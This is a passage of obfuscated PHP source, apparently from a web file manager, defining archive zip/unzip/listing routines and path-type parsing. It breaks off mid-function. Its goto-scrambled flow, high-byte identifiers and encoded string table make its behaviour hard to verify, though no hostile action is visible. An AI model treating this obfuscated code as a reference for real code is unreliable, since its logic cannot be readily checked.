<?php
 goto E¥„Õä”‹; A‰ÌÈİĞŒ¶: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $B½ÑŒ½¯Äà; if (!$B½ÑŒ½¯Äà) { $A·´´›µÅˆ = IO::init($_SERVER[çŞáÓæÚô‚Ô‡][18]); } return $A·´´›µÅˆ; } private static function iconvSystem($Fç™İ¡„Ã¸) { return self::local()->iconvSystem($Fç™İ¡„Ã¸); } private static function iconvApp($A‚ëÅÛ˜»Ø) { return self::local()->iconvApp($A‚ëÅÛ˜»Ø); } public static function zip($B†í¢Í—ˆ, $bÂ˜ò«ÛªÍ = "\172\151\160", $dßÚ¬Ë¸ÑÅ = '', $A“‹Í¡¯ºÌ = REPEAT_RENAME) { goto DÅÕå—¾ëª; b„’ã÷²ÜÈ: $B­æŒäˆ–æ = !1; if (!$dßÚ¬Ë¸ÑÅ && $cİÙ•Ÿ¥…ô->getType() == $fÆ•Œ†¹­–[112]) { $Bí£Ñ¢¼ÙÑ = self::zipFileList($B†í¢Í—ˆ); } else { $B­æŒäˆ–æ = $dßÚ¬Ë¸ÑÅ ? $dßÚ¬Ë¸ÑÅ : TEMP_FILES . $fÆ•Œ†¹­–[1032] . time() . rand_string(8) . $fÆ•Œ†¹­–[18]; mk_dir($B­æŒäˆ–æ); $Bí£Ñ¢¼ÙÑ = self::zipFileList($B†í¢Í—ˆ, $B­æŒäˆ–æ); } $CŠà«êöŞ = $aŞ¯Ÿ‡Ä¼ì[$fÆ•Œ†¹­–[38]]; goto Cç¡Ö÷Â÷ã; DÅÕå—¾ëª: $fÆ•Œ†¹­– =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cİÙ•Ÿ¥…ô = self::init($B†í¢Í—ˆ[0][$fÆ•Œ†¹­–[85]]); $aŞ¯Ÿ‡Ä¼ì = self::info($B†í¢Í—ˆ[0][$fÆ•Œ†¹­–[85]]); goto b„’ã÷²ÜÈ; D¡°‡Êäß: if (!$BÇºÆÎ¸§) { del_dir($B­æŒäˆ–æ); show_json(LNG($fÆ•Œ†¹­–[1034]), !1); } del_dir($B­æŒäˆ–æ); return $BÇºÆÎ¸§; goto FÊ«öĞËÙ; Eù„”Ğ¨¼›: $Aƒ§Ñ°¶’Å = $eÄè¦Ş»ğå . $CŠà«êöŞ . $fÆ•Œ†¹­–[101] . $bÂ˜ò«ÛªÍ; $Aƒ§Ñ°¶’Å = get_filename_auto($Aƒ§Ñ°¶’Å, $fÆ•Œ†¹­–[43], $A“‹Í¡¯ºÌ); $FÉÉ¹£…Å‡ = self::iconvSystem($Aƒ§Ñ°¶’Å); goto aèˆ¨À×¸; Cç¡Ö÷Â÷ã: if (count($Bí£Ñ¢¼ÙÑ) > 1) { $aÎê…©ŞŒ± = IO::info(IO::pathFather($aŞ¯Ÿ‡Ä¼ì[$fÆ•Œ†¹­–[85]])); $CŠà«êöŞ = $aÎê…©ŞŒ±[$fÆ•Œ†¹­–[38]]; } $eÄè¦Ş»ğå = $B­æŒäˆ–æ; if (!$eÄè¦Ş»ğå) { $eÄè¦Ş»ğå = get_path_father($aŞ¯Ÿ‡Ä¼ì[$fÆ•Œ†¹­–[85]]); if (!$dßÚ¬Ë¸ÑÅ && $cİÙ•Ÿ¥…ô->getType() == $fÆ•Œ†¹­–[112]) { $eÄè¦Ş»ğå = get_path_father($cİÙ•Ÿ¥…ô->path); } $eîášÄª…ì = IO::info($eÄè¦Ş»ğå); if (!$eîášÄª…ì[$fÆ•Œ†¹­–[199]]) { show_json(LNG($fÆ•Œ†¹­–[1033]), !1); } } goto Eù„”Ğ¨¼›; aèˆ¨À×¸: foreach ($Bí£Ñ¢¼ÙÑ as $B…ï…œù => $FèÄÏíÃğˆ) { $Bí£Ñ¢¼ÙÑ[$B…ï…œù] = self::iconvSystem($FèÄÏíÃğˆ); } KodArchive::create($FÉÉ¹£…Å‡, $Bí£Ñ¢¼ÙÑ); if (!IO::exist($Aƒ§Ñ°¶’Å)) { if ($B­æŒäˆ–æ) { del_dir($B­æŒäˆ–æ); } show_json(LNG($fÆ•Œ†¹­–[1034]), !1); } goto c¼ôïÈ¨ï™; c¼ôïÈ¨ï™: if ($dßÚ¬Ë¸ÑÅ || !$B­æŒäˆ–æ) { if ($B­æŒäˆ–æ && strstr($B­æŒäˆ–æ, TEMP_FILES)) { $F¦ŒöÑ¿ù = $Bí£Ñ¢¼ÙÑ = array(); recursion_dir($eÄè¦Ş»ğå, $F¦ŒöÑ¿ù, $Bí£Ñ¢¼ÙÑ, 0); foreach ($F¦ŒöÑ¿ù as $AÊ™„¨›®) { del_dir($AÊ™„¨›®); } foreach ($Bí£Ñ¢¼ÙÑ as $b¦ßÒ„ÁÆ) { if ($b¦ßÒ„ÁÆ == $FÉÉ¹£…Å‡) { continue; } del_file($b¦ßÒ„ÁÆ); } } return $Aƒ§Ñ°¶’Å; } $dŠ†á‰©Ï = self::pathFather($aŞ¯Ÿ‡Ä¼ì[$fÆ•Œ†¹­–[85]]); $BÇºÆÎ¸§ = self::move($Aƒ§Ñ°¶’Å, $dŠ†á‰©Ï, $A“‹Í¡¯ºÌ); goto D¡°‡Êäß; FÊ«öĞËÙ: } public static function unzip($d„«©æÑ®Ó, $a…ÄõÎåÇù = "\162\x65\x70\x6c\141\143\145") { goto CÙè»“ˆ¡¨; aæğÔºô¦: if (!@file_exists(self::iconvSystem($f…¦µè®“))) { $CíÓÍÛœÚ = self::localFilePath($eÛÓâÂÂØÅ, $bˆôôŞãâ); $f…¦µè®“ = $CíÓÍÛœÚ ? $CíÓÍÛœÚ : parent::download($eÛÓâÂÂØÅ, $f…¦µè®“); } $f…¦µè®“ = self::iconvSystem($f…¦µè®“); $aßÜäÍ©ãˆ = isset($d„«©æÑ®Ó[$BÛŸ‡·Áª†[1037]]) ? $d„«©æÑ®Ó[$BÛŸ‡·Áª†[1037]] : $BÛŸ‡·Áª†[1038]; goto CØ¯ÌëËÆ; C–ßäˆ‡ÃÉ: Hook::trigger($BÛŸ‡·Áª†[1042], $béäïå¹‡‹); recursion_dir($béäïå¹‡‹, $a•öˆ¥ÄÖä, $CíŒ˜ÀØ, 0); $e©³Àİ‹ìñ = array_merge($a•öˆ¥ÄÖä, $CíŒ˜ÀØ); goto C¦Ÿ© ™óº; bÂ¨¨è˜©: mk_dir($béäïå¹‡‹); $bˆôôŞãâ = self::fileExt($Eß¸Êó¸ ); $f…¦µè®“ = $béäïå¹‡‹ . $BÛŸ‡·Áª†[101] . $bˆôôŞãâ; goto aæğÔºô¦; C¦Ÿ© ™óº: foreach ($e©³Àİ‹ìñ as $Aš¬ö…°Ë§) { $Aš¬ö…°Ë§ = self::iconvApp($Aš¬ö…°Ë§); self::move($Aš¬ö…°Ë§, $B§‘¡·†·, $a…ÄõÎåÇù); } del_dir($béäïå¹‡‹); if (!$CíÓÍÛœÚ) { del_file($f…¦µè®“); } goto BïƒÎ˜–Ì; f•ÅãÍ®‹Ê: $D¬áàéÖ‚ = self::tmpFileName($Eß¸Êó¸ ); $béäïå¹‡‹ = TEMP_FILES . $D¬áàéÖ‚; del_dir($béäïå¹‡‹); goto bÂ¨¨è˜©; CÙè»“ˆ¡¨: $BÛŸ‡·Áª† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÛÓâÂÂØÅ = $d„«©æÑ®Ó[$BÛŸ‡·Áª†[85]]; $B§‘¡·†· = $d„«©æÑ®Ó[$BÛŸ‡·Áª†[1035]]; goto Aµ‚œÖ“ŸÊ; Aµ‚œÖ“ŸÊ: if (!($Eß¸Êó¸  = parent::info($eÛÓâÂÂØÅ))) { show_json(LNG($BÛŸ‡·Áª†[1036]), !1); } if (!($aŞ ÉªÄ = parent::infoFull($B§‘¡·†·))) { $B§‘¡·†· = parent::mkdir($B§‘¡·†·); $aŞ ÉªÄ = array($BÛŸ‡·Áª†[85] => $B§‘¡·†·); } else { if (isset($aŞ ÉªÄ[$BÛŸ‡·Áª†[378]]) && trim($aŞ ÉªÄ[$BÛŸ‡·Áª†[85]], $BÛŸ‡·Áª†[18]) != trim($B§‘¡·†·, $BÛŸ‡·Áª†[18])) { $B‰™º‰ìæÊ = KodIO::make($aŞ ÉªÄ[$BÛŸ‡·Áª†[472]]); $f˜çÀì‡± = parent::fileNameAuto($B‰™º‰ìæÊ, $aŞ ÉªÄ[$BÛŸ‡·Áª†[38]], REPEAT_RENAME_FOLDER, !0); $B§‘¡·†· = parent::mkdir($B‰™º‰ìæÊ . $f˜çÀì‡±); $aŞ ÉªÄ = array($BÛŸ‡·Áª†[85] => $B§‘¡·†·); } } $B§‘¡·†· = $aŞ ÉªÄ[$BÛŸ‡·Áª†[85]]; goto f•ÅãÍ®‹Ê; CØ¯ÌëËÆ: $d‚áÕˆ„‡ = KodArchive::extract($f…¦µè®“, $béäïå¹‡‹ . $BÛŸ‡·Áª†[18], $aßÜäÍ©ãˆ); self::archiveExt(); if (!$d‚áÕˆ„‡[$BÛŸ‡·Áª†[1039]]) { show_json($BÛŸ‡·Áª†[1040] . $d‚áÕˆ„‡[$BÛŸ‡·Áª†[1041]], !1); } goto C–ßäˆ‡ÃÉ; BïƒÎ˜–Ì: return !0; goto bÓ÷Ç–È÷ì; bÓ÷Ç–È÷ì: } public static function unzipList($cîºäåŠÏÜ) { goto D‘¦äÀòøË; cµáƒóù‚Â: $d“Û•à”Êî = json_encode($Cè‚´ËÜÃ§[$D¢Æ–¯£øö[1041]]); self::setContent($a‘ÏØ´¶µ÷, $d“Û•à”Êî); if (count($Cè‚´ËÜÃ§[$D¢Æ–¯£øö[1041]]) >= $AõèÒ÷ƒì) { show_json(sprintf(LNG($D¢Æ–¯£øö[1045]), count($Cè‚´ËÜÃ§[$D¢Æ–¯£øö[1041]])), !1); } goto cÈáßÑ³ó; D‘¦äÀòøË: $D¢Æ–¯£øö =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FÌ†‹øÅ¸Ê = $cîºäåŠÏÜ[$D¢Æ–¯£øö[85]]; $C£´ „™–‹ = isset($cîºäåŠÏÜ[$D¢Æ–¯£øö[1043]]) ? $cîºäåŠÏÜ[$D¢Æ–¯£øö[1043]] : -1; goto Eï‹íˆéğª; fïŞÇòï¾°: $E¡°±õèÔÉ = self::info($aÃ”³˜ßÊî); $c‘Å‡„ÛöÌ = self::fileExt($E¡°±õèÔÉ); $C¿­Ëªøéè = self::tmpFileName($E¡°±õèÔÉ); goto bÒ‘¿ğ¤¯¾; cÈáßÑ³ó: return $Cè‚´ËÜÃ§[$D¢Æ–¯£øö[1041]]; goto AŸ‰…•òˆ; bÒ‘¿ğ¤¯¾: if (isset($Fİ§»°îæ)) { $CÒ©Ù”ğ´ = array($Fİ§»°îæ[$D¢Æ–¯£øö[85]], $Fİ§»°îæ[$D¢Æ–¯£øö[1043]], $Fİ§»°îæ[$D¢Æ–¯£øö[38]]); $d¥ôÜ®–Òí = md5(implode($D¢Æ–¯£øö[80], $CÒ©Ù”ğ´)) . $D¢Æ–¯£øö[101] . get_path_ext($Fİ§»°îæ[$D¢Æ–¯£øö[38]]); } else { $CÒ©Ù”ğ´ = array($E¡°±õèÔÉ[$D¢Æ–¯£øö[38]], $E¡°±õèÔÉ[$D¢Æ–¯£øö[85]], $E¡°±õèÔÉ[$D¢Æ–¯£øö[87]]); $d¥ôÜ®–Òí = md5(implode($D¢Æ–¯£øö[80], $CÒ©Ù”ğ´)) . $D¢Æ–¯£øö[101] . $c‘Å‡„ÛöÌ; } if ($C£´ „™–‹ == -1) { $a‘ÏØ´¶µ÷ = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\151\145\x77\57{$C¿­Ëªøéè}\x2f{$d¥ôÜ®–Òí}\56\x6c\157\147"; $AÒØ¿‡·Ö = self::infoFull($a‘ÏØ´¶µ÷); if ($AÒØ¿‡·Ö) { $a‘ÏØ´¶µ÷ = $AÒØ¿‡·Ö[$D¢Æ–¯£øö[85]]; $eÆ½ œæÖË = self::getContent($a‘ÏØ´¶µ÷); if ($eÆ½ œæÖË) { $d“Û•à”Êî = json_decode($eÆ½ œæÖË, !0); if (count($d“Û•à”Êî) >= $AõèÒ÷ƒì) { show_json(sprintf(LNG($D¢Æ–¯£øö[1045]), count($d“Û•à”Êî)), !1); } return $d“Û•à”Êî; } } else { $a‘ÏØ´¶µ÷ = self::mkfile($a‘ÏØ´¶µ÷); } } $CÆ¡éÌ = TEMP_FILES . $C¿­Ëªøéè; goto aâ›±·•ß¨; B•›é–Ùß÷: self::archiveExt(); del_dir($CÆ¡éÌ); if (!$Cè‚´ËÜÃ§[$D¢Æ–¯£øö[1039]]) { show_json($Cè‚´ËÜÃ§[$D¢Æ–¯£øö[1041]], !1); } goto cµáƒóù‚Â; Eï‹íˆéğª: $AõèÒ÷ƒì = 50000; if (request_url_safe($FÌ†‹øÅ¸Ê)) { $Fİ§»°îæ = parse_url_query($FÌ†‹øÅ¸Ê); if (!isset($Fİ§»°îæ[$D¢Æ–¯£øö[85]])) { show_json($D¢Æ–¯£øö[1044], !1); } } $aÃ”³˜ßÊî = isset($Fİ§»°îæ) ? $Fİ§»°îæ[$D¢Æ–¯£øö[85]] : $FÌ†‹øÅ¸Ê; goto fïŞÇòï¾°; Aˆ‰¹ä«Ğ¢: $Fµ‚ç›í‰ = self::iconvSystem($Fµ‚ç›í‰); if ($C£´ „™–‹ >= 0) { $bæ©Û´áŸ  = isset($cîºäåŠÏÜ[$D¢Æ–¯£øö[1047]]) ? $cîºäåŠÏÜ[$D¢Æ–¯£øö[1047]] : !1; $BƒòŒÚø = isset($cîºäåŠÏÜ[$D¢Æ–¯£øö[38]]) ? $cîºäåŠÏÜ[$D¢Æ–¯£øö[38]] : $D¢Æ–¯£øö[43]; KodArchive::filePreview($Fµ‚ç›í‰, $C£´ „™–‹, $bæ©Û´áŸ , $BƒòŒÚø); self::archiveExt(); die; } $Cè‚´ËÜÃ§ = KodArchive::listContent($Fµ‚ç›í‰); goto B•›é–Ùß÷; aâ›±·•ß¨: if (!is_dir($CÆ¡éÌ)) { mk_dir($CÆ¡éÌ); } $Fµ‚ç›í‰ = $CÆ¡éÌ . $D¢Æ–¯£øö[18] . $d¥ôÜ®–Òí; if (!@file_exists(self::iconvSystem($Fµ‚ç›í‰))) { if (isset($Fİ§»°îæ)) { url_request($FÌ†‹øÅ¸Ê, $D¢Æ–¯£øö[1046], $Fµ‚ç›í‰); } else { $F½¡‰ï˜¬¹ = self::localFilePath($FÌ†‹øÅ¸Ê, $c‘Å‡„ÛöÌ); $Fµ‚ç›í‰ = $F½¡‰ï˜¬¹ ? $F½¡‰ï˜¬¹ : self::download($FÌ†‹øÅ¸Ê, $Fµ‚ç›í‰); } } goto Aˆ‰¹ä«Ğ¢; AŸ‰…•òˆ: } private static function fileExt($Eõª…öº¤—) { $bŸîòäñä =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C‚Õ±¼çØŠ = $Eõª…öº¤—[$bŸîòäñä[170]]; if ($C‚Õ±¼çØŠ == $bŸîòäñä[1048]) { $DôâºÃà¡¤ = $bŸîòäñä[1049]; if (substr($Eõª…öº¤—[$bŸîòäñä[38]], -strlen($DôâºÃà¡¤)) == $DôâºÃà¡¤) { $C‚Õ±¼çØŠ = $bŸîòäñä[1050]; } } self::archiveExt($C‚Õ±¼çØŠ); return $C‚Õ±¼çØŠ; } private static function zipFileList($BÎ÷ãËÊñå, $BöÅâ®ˆµ = false) { $C…ÖÜŒî‹– =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eíä£Á¾Ğô = array(); foreach ($BÎ÷ãËÊñå as $FÔáÂâÅ) { $dîƒÅÅÚõ× = $FÔáÂâÅ[$C…ÖÜŒî‹–[85]]; if ($BöÅâ®ˆµ) { $dîƒÅÅÚõ× = self::copy($FÔáÂâÅ[$C…ÖÜŒî‹–[85]], $BöÅâ®ˆµ, $C…ÖÜŒî‹–[753]); } else { $DŠõµ‘Æµ‘ = self::init($FÔáÂâÅ[$C…ÖÜŒî‹–[85]]); if ($DŠõµ‘Æµ‘->getType() == $C…ÖÜŒî‹–[112]) { $dîƒÅÅÚõ× = $DŠõµ‘Æµ‘->path; } } if ($dîƒÅÅÚõ× && self::local()->exist($dîƒÅÅÚõ×)) { $Eíä£Á¾Ğô[$FÔáÂâÅ[$C…ÖÜŒî‹–[85]]] = $dîƒÅÅÚõ×; } } if (!empty($Eíä£Á¾Ğô)) { return array_values($Eíä£Á¾Ğô); } show_json(LNG($C…ÖÜŒî‹–[1051]), !1); } public static function tmpFileName($E‡­ÍÀŒ÷ğ) { $CŠœ§Û‰—ß =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eõù­Šèé = array($E‡­ÍÀŒ÷ğ[$CŠœ§Û‰—ß[38]], $E‡­ÍÀŒ÷ğ[$CŠœ§Û‰—ß[85]], $E‡­ÍÀŒ÷ğ[$CŠœ§Û‰—ß[87]], $E‡­ÍÀŒ÷ğ[$CŠœ§Û‰—ß[470]]); return md5(implode($CŠœ§Û‰—ß[80], $eõù­Šèé)); } private static function localFilePath($D‹½ÅÖĞ“§, $C¥À–š “Ç) { goto b½­æšÆê; Aôí¸ˆºÁí: if ($f“¤¹è£³ò[$BäËŠ„ÄŠ[39]] == KodIO::KOD_SOURCE) { $Fé¹Í·ø‰ = Model($BäËŠ„ÄŠ[761])->fileInfoGet(KodIO::sourceID($D‹½ÅÖĞ“§)); if (!$Fé¹Í·ø‰[$BäËŠ„ÄŠ[85]]) { show_json($BäËŠ„ÄŠ[1054], !1); } $D‹½ÅÖĞ“§ = $Fé¹Í·ø‰[$BäËŠ„ÄŠ[85]]; } $B¡ÆÛÜ½Ğ = self::init($D‹½ÅÖĞ“§); $bÑô»˜›¨ä = $B¡ÆÛÜ½Ğ->getType(); goto AŞ…™ïæ—; b½­æšÆê: $BäËŠ„ÄŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($C¥À–š “Ç == $BäËŠ„ÄŠ[1052] && strtoupper(substr(PHP_OS, 0, 3)) == $BäËŠ„ÄŠ[1053]) { return !1; } $f“¤¹è£³ò = KodIO::parse($D‹½ÅÖĞ“§); goto Aôí¸ˆºÁí; AŞ…™ïæ—: if ($bÑô»˜›¨ä == $BäËŠ„ÄŠ[112] || $bÑô»˜›¨ä == $BäËŠ„ÄŠ[1055]) { if (!$B¡ÆÛÜ½Ğ->exist($B¡ÆÛÜ½Ğ->path)) { show_json(LNG($BäËŠ„ÄŠ[111]), !1); } return $B¡ÆÛÜ½Ğ->path; } return !1; goto eÒ¡ˆ¤Œ…; eÒ¡ˆ¤Œ…: } private static function archiveExt($cè‚ö‰İö = '') { $GLOBALS[$_SERVER[çŞáÓæÚô‚Ô‡][1056]] = $cè‚ö‰İö; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\162\122\145\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\x72\106\151\x6c\145\124\141\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\x72\106\151\154\145\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\x75\160\122\157\157\x74\x53\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\173\165\x73\x65\162\x53\x68\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\123\x68\141\162\145\114\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\141\162\x65\x54\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\145\x49\x74\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\x61\x72\145\x49\164\145\155\114\x69\156\x6b\175"; const KOD_SEARCH = "\173\163\145\141\162\x63\150\x7d"; const KOD_BLOCK = "\173\142\154\x6f\143\x6b\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\163\x65\162\122\x65\156\143\145\156\164\175"; const KOD_USER_DRIVER = "\173\x64\x72\x69\166\145\162\x7d"; public static function typeList() { $e§°‘Ã† =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($e§°‘Ã†[1057] => self::KOD_SOURCE, $e§°‘Ã†[1058] => self::KOD_USER_RECYCLE, $e§°‘Ã†[1059] => self::KOD_USER_FAV, $e§°‘Ã†[1060] => self::KOD_USER_FILE_TAG, $e§°‘Ã†[1061] => self::KOD_USER_FILE_TYPE, $e§°‘Ã†[1062] => self::KOD_GROUP_ROOT_SELF, $e§°‘Ã†[1063] => self::KOD_USER_SHARE, $e§°‘Ã†[1064] => self::KOD_USER_SHARE_LINK, $e§°‘Ã†[1065] => self::KOD_USER_SHARE_TO_ME, $e§°‘Ã†[1066] => self::KOD_SHARE_ITEM, $e§°‘Ã†[1067] => self::KOD_SHARE_LINK, $e§°‘Ã†[1068] => self::KOD_SEARCH, $e§°‘Ã†[1069] => self::KOD_BLOCK, $e§°‘Ã†[1070] => self::KOD_IO, $e§°‘Ã†[1071] => self::KOD_USER_RECENT, $e§°‘Ã†[1072] => self::KOD_USER_DRIVER); } public static function parse($aà‰íêÆ) { goto b¢·…®Æ£; a„ŠÜ¹ø: $eìÊ‰ßÍ’“ = array($a—ÛªöÊ×á[43], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $aëÆÖˆ¨õ[$a—ÛªöÊ×á[1077]] = in_array($aëÆÖˆ¨õ[$a—ÛªöÊ×á[39]], $eìÊ‰ßÍ’“); return $aëÆÖˆ¨õ; goto FÕÉ†¸¹İ½; FÛËêŒ«ºğ: preg_match($a—ÛªöÊ×á[1073], $aà‰íêÆ, $CÃ®¬‰•²–); $aëÆÖˆ¨õ = array($a—ÛªöÊ×á[397] => !1, $a—ÛªöÊ×á[1074] => !1, $a—ÛªöÊ×á[394] => !1, $a—ÛªöÊ×á[85] => $aà‰íêÆ, $a—ÛªöÊ×á[1020] => !1, $a—ÛªöÊ×á[1019] => $a—ÛªöÊ×á[43]); if (is_array($CÃ®¬‰•²–) && count($CÃ®¬‰•²–) == 5) { $CØùÒ‘Ú§Œ = $a—ÛªöÊ×á[1075] . $CÃ®¬‰•²–[2] . $a—ÛªöÊ×á[324]; if (in_array($CØùÒ‘Ú§Œ, $Dì­Ùï˜í…)) { $aëÆÖˆ¨õ[$a—ÛªöÊ×á[1020]] = $CÃ®¬‰•²–[1]; $aëÆÖˆ¨õ[$a—ÛªöÊ×á[39]] = $CØùÒ‘Ú§Œ; $aëÆÖˆ¨õ[$a—ÛªöÊ×á[1076]] = substr($CØùÒ‘Ú§Œ, 1, -1); $aëÆÖˆ¨õ[$a—ÛªöÊ×á[376]] = $CÃ®¬‰•²–[3]; } $aëÆÖˆ¨õ[$a—ÛªöÊ×á[1019]] = $CÃ®¬‰•²–[4]; } goto a„ŠÜ¹ø; b¢·…®Æ£: $a—ÛªöÊ×á =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aà‰íêÆ = self::clear($aà‰íêÆ); $Dì­Ùï˜í… = array_values(self::typeList()); goto FÛËêŒ«ºğ; FÕÉ†¸¹İ½: } public static function clear($eò»õ…åÃÚ) { goto Fëº“© ÊÔ; BÒßªÃò×â: $CœãÜ¿‹˜ˆ = $BÁÜ‹¢¦Ûô[1078]; if (substr($eò»õ…åÃÚ, 0, 3) == $BÁÜ‹¢¦Ûô[1079]) { $eò»õ…åÃÚ = substr($eò»õ…åÃÚ, 3); } while (strstr($eò»õ…åÃÚ, $CœãÜ¿‹˜ˆ)) { $eò»õ…åÃÚ = str_replace($CœãÜ¿‹˜ˆ, $BÁÜ‹¢¦Ûô[18], $eò»õ…åÃÚ); } goto F½ÚºËË†‘; DŒğë¥ÎÜ: return $eò»õ…åÃÚ; goto EìóÃË‡†Å; F½ÚºËË†‘: $eò»õ…åÃÚ = preg_replace($BÁÜ‹¢¦Ûô[1080], $BÁÜ‹¢¦Ûô[18], $eò»õ…åÃÚ); if ($eò»õ…åÃÚ == $BÁÜ‹¢¦Ûô[18]) { return $BÁÜ‹¢¦Ûô[18]; } $eò»õ…åÃÚ = rtrim($eò»õ…åÃÚ, $BÁÜ‹¢¦Ûô[18]); goto DŒğë¥ÎÜ; Fëº“© ÊÔ: $BÁÜ‹¢¦Ûô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eò»õ…åÃÚ = str_replace(array($BÁÜ‹¢¦Ûô[999], $BÁÜ‹¢¦Ûô[11]), $BÁÜ‹¢¦Ûô[60], $eò»õ…åÃÚ); $eò»õ…åÃÚ = str_replace($BÁÜ‹¢¦Ûô[103], $BÁÜ‹¢¦Ûô[18], $eò»õ…åÃÚ); goto BÒßªÃò×â; EìóÃË‡†Å: } public static function sourceID($A¬Ö‹ÌŠÍ») { $fÊèöÀ°ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dÏÅÌÁ ƒ¦ = self::parse($A¬Ö‹ÌŠÍ»); if ($dÏÅÌÁ ƒ¦[$fÊèöÀ°ˆ[39]] !== self::KOD_SOURCE) { show_json(LNG($fÊèöÀ°ˆ[1081]), !1); } return $dÏÅÌÁ ƒ¦[$fÊèöÀ°ˆ[376]]; } public static function make($dÚ£Ã¡ïâ’) { if (!$dÚ£Ã¡ïâ’) { return !1; } return self::makePath(self::KOD_SOURCE, intval($dÚ£Ã¡ïâ’)); } public static function makeShare($D¹«…èæ‘, $FÁ‚„÷÷³˜) { return self::makePath(self::KOD_SHARE_ITEM, $D¹«…èæ‘, $FÁ‚„÷÷³˜); } public static function makeFileTypePath($Bª¬‡†Î¹) { return self::makePath(self::KOD_USER_FILE_TYPE, $Bª¬‡†Î¹); } public static function makeFileTagPath($eäèİ»£) { return self::makePath(self::KOD_USER_FILE_TAG, $eäèİ»£); } public static function makePath($a‹¸£ğë¸, $côøŒ“µ–¤ = '', $d­ºñ£ö¼ = '') { $bÄ‘³ÛÏ×ø =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EáÊŒ‚‡«¿ = substr($a‹¸£ğë¸, 1, -1); $dÆÜ÷ŒæŒ = $bÄ‘³ÛÏ×ø[1082] . $EáÊŒ‚‡«¿ . $bÄ‘³ÛÏ×ø[1083] . $côøŒ“µ–¤ . $bÄ‘³ÛÏ×ø[1084]; $dÆÜ÷ŒæŒ = $d­ºñ£ö¼ ? $dÆÜ÷ŒæŒ . $d­ºñ£ö¼ . $bÄ‘³ÛÏ×ø[18] : $dÆÜ÷ŒæŒ; return $dÆÜ÷ŒæŒ; } public static function hashPath($fğé›£¶ùï) { $dÜ¿¥ºå =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eéâİæá•Å = is_array($fğé›£¶ùï) ? $fğé›£¶ùï : IO::info($fğé›£¶ùï); $dĞì—ƒ‚Ãç = _get($Eéâİæá•Å, $dÜ¿¥ºå[1085], $dÜ¿¥ºå[43]); if (!$dĞì—ƒ‚Ãç) { $Fã’Óùõä = KodIO::parse($Eéâİæá•Å[$dÜ¿¥ºå[85]]); if (!$Fã’Óùõä[$dÜ¿¥ºå[39]]) { $dĞì—ƒ‚Ãç = IO::hashSimple($Eéâİæá•Å[$dÜ¿¥ºå[85]]); } } if (!$dĞì—ƒ‚Ãç) { $dĞì—ƒ‚Ãç = md5($Eéâİæá•Å[$dÜ¿¥ºå[85]] . $Eéâİæá•Å[$dÜ¿¥ºå[87]] . $Eéâİæá•Å[$dÜ¿¥ºå[117]]); } return $dĞì—ƒ‚Ãç; } public static function initSystemPath() { $F°‰áŠ«âõ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (defined($F°‰áŠ«âõ[1086])) { return; } define($F°‰áŠ«âõ[1086], self::systemPath($F°‰áŠ«âõ[1087])); define($F°‰áŠ«âõ[1088], self::systemPath($F°‰áŠ«âõ[1089])); define($F°‰áŠ«âõ[1090], self::systemPath($F°‰áŠ«âõ[1091])); define($F°‰áŠ«âõ[1092], self::systemPath($F°‰áŠ«âõ[1093])); } private static function systemPath($fµáÍĞÇ‘‹) { goto c¢Şí¢Öˆã; c¢Şí¢Öˆã: $a¸‚Š™¢¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f§Ú‚»¿ÈÀ = $a¸‚Š™¢¹[1094] . ucfirst($fµáÍĞÇ‘‹); $dæ•…Â›òí = Model($a¸‚Š™¢¹[1095])->get($f§Ú‚»¿ÈÀ); goto E§º¡øİš…; eô½©‹‘ƒÇ: return $dæ•…Â›òí; goto Fßã‘ƒ„; E§º¡øİš…: if ($dæ•…Â›òí) { return $dæ•…Â›òí; } if ($fµáÍĞÇ‘‹ == $a¸‚Š™¢¹[1087]) { $dæ•…Â›òí = self::make(Model($a¸‚Š™¢¹[761])->systemRootPathAdd($a¸‚Š™¢¹[1096])); } else { $dæ•…Â›òí = self::systemPath($a¸‚Š™¢¹[1087]); $c—Äó×Íº = self::sourceID($dæ•…Â›òí); $dæ•…Â›òí = self::make(Model($a¸‚Š™¢¹[761])->mkdir($c—Äó×Íº, $fµáÍĞÇ‘‹)); } Model($a¸‚Š™¢¹[1095])->set($f§Ú‚»¿ÈÀ, $dæ•…Â›òí); goto eô½©‹‘ƒÇ; Fßã‘ƒ„: } public static function systemFolder($DŒƒ¼šÉİÒ) { $b‹óÕš„– = IO_PATH_SYSTEM_SOURCE . $DŒƒ¼šÉİÒ; $CÒë¹ˆĞİÈ = Cache::get($b‹óÕš„–); if (!$CÒë¹ˆĞİÈ) { $DàÑèÛ¦°Ş = IO::infoFull($b‹óÕš„–); if (!$DàÑèÛ¦°Ş) { $CÒë¹ˆĞİÈ = IO::mkdir($b‹óÕš„–, 